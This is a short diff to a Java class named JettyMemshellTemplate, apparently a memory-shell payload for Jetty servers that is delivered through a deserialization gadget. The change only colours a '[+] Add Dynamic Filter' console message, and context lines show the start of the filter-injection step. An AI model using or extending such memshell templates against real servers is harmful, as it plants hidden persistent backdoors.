@@ -19,6 +19,8 @@ import java.lang.reflect.Modifier;
 import java.util.EnumSet;
 import java.util.Set;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 public class JettyMemshellTemplate extends AbstractTranslet {
     public JettyMemshellTemplate(){
         try{
@@ -66,7 +68,7 @@ public class JettyMemshellTemplate extends AbstractTranslet {
                     }
 
                     if(!flag){
-                        System.out.println("[+] Add Dynamic Filter");
+                        System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));
 
                         ClassLoader classLoader = handler.getClass().getClassLoader();
                         Class sourceClazz = null;
